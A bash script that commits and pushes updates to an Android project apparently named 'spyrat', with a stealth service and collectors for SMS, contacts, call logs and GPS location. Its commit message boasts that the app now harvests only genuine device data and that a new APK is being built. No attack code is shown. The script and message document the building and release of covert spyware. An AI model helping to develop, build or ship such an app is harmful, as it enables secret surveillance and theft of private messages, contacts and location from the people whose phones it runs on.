#!/bin/bash

echo "🚀 PUSHING REAL DATA FIXES TO GITHUB..."

cd ~/Investigation-Rat2

# Check git status
echo "📊 Checking git status..."
git status

# Add the fixed files
echo "📦 Adding real data fixes..."
git add app/src/main/java/com/spyrat/investigation/RealSmsCollector.java
git add app/src/main/java/com/spyrat/investigation/RealContactsCollector.java
git add app/src/main/java/com/spyrat/investigation/RealCallLogCollector.java
git add app/src/main/java/com/spyrat/investigation/StealthService.java

# Commit the fixes
echo "💾 Committing real data fixes..."
git commit -m "Remove ALL test data - use ONLY real device data

🔍 REAL DATA COLLECTION:
- COMPLETELY removed test/mock data from all collectors
- SMS collector now ONLY reads real SMS from device
- Contacts collector now ONLY reads real contacts from device  
- Call log collector now ONLY reads real call history from device
- Location collector returns NULL when no real location available

📱 DATA FLOW IMPROVEMENTS:
- Added debug logging to track real data collection
- Empty arrays returned when no real data available (no fake data)
- Permission errors logged clearly
- Real device data isolation maintained

🎯 TRUTHFUL DATA:
- No more 'Test Contact 1' or '+255123456789' fake data
- No more sample SMS messages
- No more fake call logs
- ONLY authentic device data collected

⚠️ PERMISSION REQUIREMENTS:
App requires actual permissions to access real data:
- READ_SMS for real SMS messages
- READ_CONTACTS for real contact lists  
- READ_CALL_LOG for real call history
- Location permissions for real GPS data

📊 DATA VALIDATION:
App will now show:
- ✅ Real SMS from device (if permissions granted)
- ✅ Real contacts from device (if permissions granted) 
- ✅ Real call logs from device (if permissions granted)
- ✅ Real location data (if permissions granted)
- ❌ Empty data when permissions denied (NO fake data)"

# Push to GitHub
echo "📤 Pushing to GitHub..."
git push origin main

echo "✅ REAL DATA FIXES PUSHED SUCCESSFULLY!"
echo "🔗 GitHub Actions building new APK..."
echo "📱 New APK will collect ONLY real device data"

# Wait a bit and check build status
sleep 10
echo "🌐 Check build status at: https://github.com/your-username/Investigation-Rat2/actions"
